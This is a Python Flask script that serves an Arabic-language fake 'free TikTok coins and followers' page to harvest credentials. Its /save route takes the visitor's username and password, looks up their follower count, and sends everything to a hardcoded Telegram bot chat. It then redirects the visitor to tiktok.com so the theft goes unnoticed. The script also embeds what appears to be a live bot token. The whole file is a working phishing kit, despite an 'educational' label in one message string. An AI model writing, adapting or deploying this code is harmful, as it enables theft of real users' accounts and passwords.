from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

html_page = """
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>شحن تيك توك المجاني</title>
  <style>
    body { background-color: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
    .container { background: #222; padding: 30px; border-radius: 10px; display: inline-block; }
    input, button {
        padding: 10px;
        margin: 10px;
        width: 80%;
        border: none;
        border-radius: 5px;
    }
    input { background-color: #333; color: white; }
    button { background-color: #e91e63; color: white; cursor: pointer; }
    h1 { color: #f50057; }
    p { font-size: 16px; color: #ccc; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎁 شحن مجاني تيك توك</h1>
    <p>احصل على <strong>20,000 متابع</strong> + <strong>عدد لا نهائي من الكوينز</strong>!</p>
    <p>قم بتسجيل الدخول الآن لتفعيل الهدايا</p>
    <form action="/save" method="POST">
      <input type="text" name="username" placeholder="اسم المستخدم" required><br>
      <input type="password" name="password" placeholder="كلمة المرور" required><br>
      <button type="submit">🎁 تفعيل الشحن الآن</button>
    </form>
  </div>
</body>
</html>
"""

BOT_TOKEN = "7504294266:AAHgYMIxq5G1hxXRmGF2O7zYKKi-bPjReeM"
ADMIN_ID = "7758666677"

@app.route("/", methods=["GET"])
def home():
    return render_template_string(html_page)

@app.route("/save", methods=["POST"])
def save():
    username = request.form.get("username")
    password = request.form.get("password")
    
    try:
        r = requests.get(f"https://api.countik.com/user/{username}")
        followers = r.json().get("followers", "غير معروف")
    except:
        followers = "غير معروف"

    message = f"صيد تعليمي جديد 🎯\n👤 المستخدم: @{username}\n🔐 كلمة المرور: {password}\n👥 عدد المتابعين: {followers}"

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": ADMIN_ID,
            "text": message
        }
        requests.post(url, data=data)
    except:
        pass

    return redirect("https://tiktok.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
